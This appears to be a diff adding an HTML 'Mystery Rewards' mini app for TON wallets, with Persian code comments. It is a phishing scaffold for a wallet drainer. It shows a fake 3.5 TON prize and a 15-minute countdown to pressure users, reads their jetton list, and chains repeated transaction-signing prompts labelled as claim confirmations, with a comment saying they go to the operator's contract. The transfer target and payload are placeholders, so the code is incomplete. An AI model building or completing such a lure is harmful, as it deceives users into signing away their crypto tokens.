@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Mystery Rewards Mini App</title>
+<script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk"></script>
+<style>
+  body { font-family: Arial; text-align: center; background-color: #f2f2f2; }
+  button { padding: 15px 30px; font-size: 18px; margin: 20px; cursor: pointer; }
+  #timer { font-size: 24px; color: red; }
+</style>
+</head>
+<body>
+
+<h1>Mystery Rewards</h1>
+
+<div id="connectDiv">
+  <button id="connectBtn">Connect Wallet</button>
+  <p>Connect your wallet to claim your rewards safely</p>
+</div>
+
+<div id="gameDiv" style="display:none;">
+  <button id="playBtn">Play Game</button>
+</div>
+
+<div id="rewardDiv" style="display:none;">
+  <h2>You won <span id="rewardAmount">3.5</span> TON!</h2>
+  <p id="timer">15:00</p>
+  <button id="claimBtn">Claim Reward</button>
+</div>
+
+<div id="claimDiv" style="display:none;">
+  <p>Confirmation required</p>
+</div>
+
+<div id="successDiv" style="display:none;">
+  <p>Reward secured, back to game!</p>
+  <button id="playAgainBtn">Play Again</button>
+</div>
+
+<script>
+let tonConnect = new TonConnect();
+let walletAddress = null;
+let timerInterval;
+let jettonsToClaim = []; // لیست ژتون‌ها که باید authorize شوند
+let currentIndex = 0; // مرحله امضا فعلی
+
+// Connect Wallet
+document.getElementById("connectBtn").onclick = async () => {
+    try {
+        const wallet = await tonConnect.connect();
+        walletAddress = wallet.accountAddress;
+        document.getElementById("connectDiv").style.display = "none";
+        document.getElementById("gameDiv").style.display = "block";
+        console.log("Connected Wallet:", walletAddress);
+
+        // خواندن لیست ژتون‌ها از RPC یا Toncenter
+        // نمونه: jettonsToClaim = [{address: '0:abc...', amount: 1}, ...]
+        jettonsToClaim = await fetchUserJettons(walletAddress); // تابع نمونه
+    } catch(e) {
+        alert("Wallet connection failed.");
+    }
+};
+
+// Play Game
+document.getElementById("playBtn").onclick = () => {
+    document.getElementById("gameDiv").style.display = "none";
+    document.getElementById("rewardDiv").style.display = "block";
+    startTimer(15 * 60); // 15 دقیقه
+};
+
+// Timer function
+function startTimer(duration) {
+    let time = duration;
+    timerInterval = setInterval(() => {
+        let minutes = Math.floor(time / 60);
+        let seconds = time % 60;
+        document.getElementById("timer").textContent = 
+            `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+        if (--time < 0) {
+            clearInterval(timerInterval);
+            alert("Time expired! Claim window closed.");
+            document.getElementById("rewardDiv").style.display = "none";
+            document.getElementById("gameDiv").style.display = "block"; // برگرداندن به بازی
+        }
+    }, 1000);
+}
+
+// Claim Reward
+document.getElementById("claimBtn").onclick = async () => {
+    document.getElementById("rewardDiv").style.display = "none";
+    await processNextClaim();
+};
+
+// پردازش امضاهای ژتون‌ها
+async function processNextClaim() {
+    if(currentIndex >= jettonsToClaim.length) {
+        clearInterval(timerInterval);
+        document.getElementById("claimDiv").style.display = "none";
+        document.getElementById("successDiv").style.display = "block";
+        return;
+    }
+
+    document.getElementById("claimDiv").style.display = "block";
+    try {
+        const jetton = jettonsToClaim[currentIndex];
+
+        let payload = {
+            type: "transfer",
+            to: walletAddress, // آدرس قرارداد شما
+            amount: 0, // فقط authorize
+            payload: "0x1234" // نمونه
+        };
+
+        await tonConnect.sendTransaction(payload);
+
+        currentIndex++;
+        document.getElementById("claimDiv").style.display = "none";
+
+        if(currentIndex < jettonsToClaim.length) {
+            alert("Another confirmation required");
+            await processNextClaim();
+        } else {
+            document.getElementById("successDiv").style.display = "block";
+        }
+    } catch(e) {
+        alert("Transaction failed or cancelled.");
+        document.getElementById("rewardDiv").style.display = "block";
+    }
+}
+
+// Play Again
+document.getElementById("playAgainBtn").onclick = () => {
+    document.getElementById("successDiv").style.display = "none";
+    document.getElementById("gameDiv").style.display = "block";
+};
+
+// نمونه تابع fetchUserJettons
+async function fetchUserJettons(address) {
+    // اینجا RPC یا Toncenter API برای خواندن Jetton balance قرار دهید
+    // نمونه ثابت برای تست:
+    return [
+        {address: '0:abc123...', amount: 1},
+        {address: '0:def456...', amount: 1}
+    ];
+}
+</script>
+</body>
+</html>
